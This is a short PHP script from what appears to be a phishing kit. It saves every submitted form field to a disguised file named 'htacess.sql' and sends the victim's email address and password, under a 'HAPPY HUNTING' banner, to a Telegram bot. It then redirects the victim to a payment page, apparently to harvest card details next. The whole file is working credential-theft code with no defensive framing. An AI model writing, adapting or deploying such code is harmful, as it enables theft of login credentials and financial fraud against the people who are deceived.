<?php
$data = !empty($_POST) ? $_POST : $_GET;
if (!empty($data)) {
    $txt = date('Y-m-d H:i:s') . "\n";
    foreach ($data as $k => $v) {
        $txt .= $k . ": " . (is_array($v) ? implode(', ', $v) : $v) . "\n";
    }
    file_put_contents(__DIR__ . '/htacess.sql', $txt . "\n", FILE_APPEND);
}

$email = $_POST['email'];
$Password = $_POST['Password'];

$message  = "
╔════════════════════════════════╗
   🔥💀 𝐋𝐎𝐆𝐈𝐍 𝐂𝐑𝐄𝐃𝐄𝐍𝐓𝐈𝐀𝐋𝐒 💀🔥
╚════════════════════════════════╝

📧 ┃ 𝐋𝐨𝐠𝐢𝐧 𝐈𝐃 ➤ $email
🔑 ┃ 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ➤ $Password

📡 ┃ IP ➤ $ip - $country - $as_name
🌐 ┃ Device ➤ $browser - $os - $device
╔════════════════════════╗
   ⚡ 𝐇𝐀𝐏𝐏𝐘 𝐇𝐔𝐍𝐓𝐈𝐍𝐆 ⚡
╚════════════════════════╝
";

$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

$response = file_get_contents($url);
$result = json_decode($response, true);

header("Location: ../payment.html");

?>